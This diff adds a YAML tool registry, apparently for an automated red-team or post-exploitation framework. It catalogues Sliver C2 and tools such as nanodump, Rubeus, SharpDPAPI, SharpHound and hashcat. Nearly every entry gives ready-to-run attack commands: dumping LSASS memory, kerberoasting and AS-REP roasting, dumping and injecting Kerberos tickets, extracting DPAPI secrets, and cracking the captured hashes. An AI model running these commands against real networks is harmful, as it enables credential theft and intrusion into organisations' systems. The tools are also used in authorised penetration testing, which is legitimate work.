@@ -1,0 +1,72 @@
+sliver:
+  description: "Sliver C2 — executes BOFs and .NET assemblies in-memory"
+  category: c2
+  verify_cmd: "sliver version"
+  examples:
+    - "sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o"
+    - "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast"
+    - "sliver [session] > sideload /opt/tools/library.dll entrypoint args"
+    - "sliver [session] > hashdump"
+
+nanodump:
+  description: "LSASS memory dumper via direct syscalls — stealthiest method"
+  category: credential_access
+  verify_cmd: "test -f /opt/tools/bofs/nanodump.x64.o && echo OK"
+  examples:
+    - "sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o --write C:\\Windows\\Temp\\debug.dmp"
+
+rubeus:
+  description: "Kerberos attack toolkit — kerberoast, AS-REP roast, ticket manipulation"
+  category: credential_access
+  verify_cmd: "test -f /opt/tools/Rubeus.exe && echo OK"
+  examples:
+    - "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast /outfile:hashes.txt"
+    - "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- asreproast"
+    - "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- triage"
+    - "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- dump"
+    - "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- ptt /ticket:BASE64"
+
+sharphound:
+  description: "BloodHound AD data collector"
+  category: discovery
+  verify_cmd: "test -f /opt/tools/SharpHound.exe && echo OK"
+  examples:
+    - "sliver [session] > execute-assembly /opt/tools/SharpHound.exe -- -c All"
+
+seatbelt:
+  description: "Host security enumeration"
+  category: discovery
+  verify_cmd: "test -f /opt/tools/Seatbelt.exe && echo OK"
+  examples:
+    - "sliver [session] > execute-assembly /opt/tools/Seatbelt.exe -- -group=all"
+
+adsearch:
+  description: "LDAP/AD search and enumeration"
+  category: discovery
+  verify_cmd: "test -f /opt/tools/ADSearch.exe && echo OK"
+  examples:
+    - "sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- --search '(objectClass=user)'"
+
+sharpdpapi:
+  description: "DPAPI credential extraction"
+  category: credential_access
+  verify_cmd: "test -f /opt/tools/SharpDPAPI.exe && echo OK"
+  examples:
+    - "sliver [session] > execute-assembly /opt/tools/SharpDPAPI.exe -- triage"
+
+pypykatz:
+  description: "Python LSASS dump parser — processes nanodump output on Kali"
+  category: credential_access
+  install_cmd: "pip3 install pypykatz"
+  verify_cmd: "pypykatz -h 2>&1 | head -3"
+  examples:
+    - "pypykatz lsa minidump /tmp/lsass.dmp"
+
+hashcat:
+  description: "Hash cracker — processes kerberoast/AS-REP hashes"
+  category: credential_access
+  verify_cmd: "hashcat --version"
+  examples:
+    - "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
+    - "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+    - "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt"
